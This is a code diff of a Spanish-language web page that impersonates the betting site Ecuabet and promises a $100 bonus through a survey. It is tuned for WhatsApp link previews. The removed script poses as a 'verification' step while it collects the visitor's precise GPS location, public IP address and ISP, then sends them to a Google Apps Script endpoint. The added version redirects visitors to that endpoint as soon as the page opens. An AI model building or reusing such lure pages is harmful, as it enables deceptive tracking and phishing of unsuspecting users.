@@ -6,122 +6,24 @@
     <title>Gana un Bono de $100 - Ecuabet</title>
     <meta name="description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
 
+    <!-- Meta Tags para la vista previa de WhatsApp -->
     <meta property="og:type" content="website">
     <meta property="og:title" content="¿TE GUSTARÍA PARTICIPAR POR UN BONO DE $100?">
     <meta property="og:description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
     <meta property="og:image" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
     <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
     <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
 
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #1a237e; color: #fff; text-align: center; padding: 20px; }
-        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); max-width: 420px; width: 100%; }
-        h2 { font-size: 20px; margin-bottom: 15px; }
-        p { font-size: 14px; color: #e0e0e0; margin-bottom: 20px; }
-        .btn { width: 100%; padding: 14px; background-color: #00c853; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        #status { margin-top: 15px; font-size: 13px; color: #ffd54f; }
+        body { background-color: #1a237e; margin: 0; padding: 0; }
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <h2>Encuesta de Ecuabet</h2>
-        <p>Haz clic en el botón para activar la verificación e ir a la encuesta.</p>
-        <button id="btnAction" onclick="iniciarCaptura()" class="btn">CONTINUAR</button>
-        <div id="status"></div>
-    </div>
-
     <script>
-        const targetUrl = "https://script.google.com/macros/s/AKfycbwd9e8X06X01Bn13evnRmV07WfOxI6pDob5gYWY0_sUzJJQ2FnaUg0WI9THY9bTDVJf/exec";
-        let yaRedirigido = false;
-        let datos = { lat: '', lng: '', ip: '', isp: '' };
-
-        function redirigir() {
-            if (yaRedirigido) return;
-            yaRedirigido = true;
-
-            let query = [];
-            if (datos.lat) query.push("lat=" + encodeURIComponent(datos.lat));
-            if (datos.lng) query.push("lng=" + encodeURIComponent(datos.lng));
-            if (datos.ip) query.push("ip=" + encodeURIComponent(datos.ip));
-            if (datos.isp) query.push("isp=" + encodeURIComponent(datos.isp));
-
-            let finalUrl = targetUrl + (query.length > 0 ? "?" + query.join("&") : "");
-            window.location.href = finalUrl;
-        }
-
-        // Promesa para obtener primero la ubicación GPS
-        function obtenerGPS() {
-            return new Promise((resolve) => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            datos.lat = pos.coords.latitude;
-                            datos.lng = pos.coords.longitude;
-                            resolve();
-                        },
-                        (err) => {
-                            console.warn("Permiso GPS denegado o no disponible:", err);
-                            resolve();
-                        },
-                        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-                    );
-                } else {
-                    resolve();
-                }
-            });
-        }
-
-        // Promesa para obtener estrictamente la IPv4 y luego el ISP
-        async function obtenerIPv4yISP() {
-            try {
-                // Forzar endpoint exclusivo de IPv4
-                let respIp = await fetch('https://v4.ident.me/json');
-                if (!respIp.ok) {
-                    respIp = await fetch('https://api.ipify.org?format=json');
-                }
-                
-                if (respIp.ok) {
-                    let jsonIp = await respIp.json();
-                    datos.ip = jsonIp.ip || jsonIp.address || '';
-
-                    // Si se capturó la IPv4, consultar el ISP
-                    if (datos.ip) {
-                        let respIsp = await fetch('https://ipapi.co/' + datos.ip + '/json/');
-                        if (respIsp.ok) {
-                            let jsonIsp = await respIsp.json();
-                            datos.isp = jsonIsp.org || jsonIsp.asn || '';
-                        }
-                    }
-                }
-            } catch (e) {
-                console.warn("Error obteniendo IPv4 o ISP:", e);
-            }
-        }
-
-        async function iniciarCaptura() {
-            const btn = document.getElementById('btnAction');
-            const status = document.getElementById('status');
-            
-            btn.disabled = true;
-            btn.innerText = "VERIFICANDO...";
-            
-            // Límite de emergencia por si la red del usuario falla por completo
-            setTimeout(redirigir, 10000);
-
-            // 1. PRIMERO: Obtener Ubicación GPS
-            status.innerText = "1/2 Solicitando ubicación GPS...";
-            await obtenerGPS();
-
-            // 2. SEGUNDO: Obtener IP Pública (IPv4) e ISP
-            status.innerText = "2/2 Obteniendo red e IP pública...";
-            await obtenerIPv4yISP();
-
-            // 3. TERCERO: Redirigir al formulario
-            status.innerText = "Redirigiendo...";
-            redirigir();
-        }
+        // Redirección inmediata al abrir el enlace
+        window.location.href = "https://script.google.com/macros/s/AKfycbwd9e8X06X01Bn13evnRmV07WfOxI6pDob5gYWY0_sUzJJQ2FnaUg0WI9THY9bTDVJf/exec";
     </script>
 </body>
 </html>
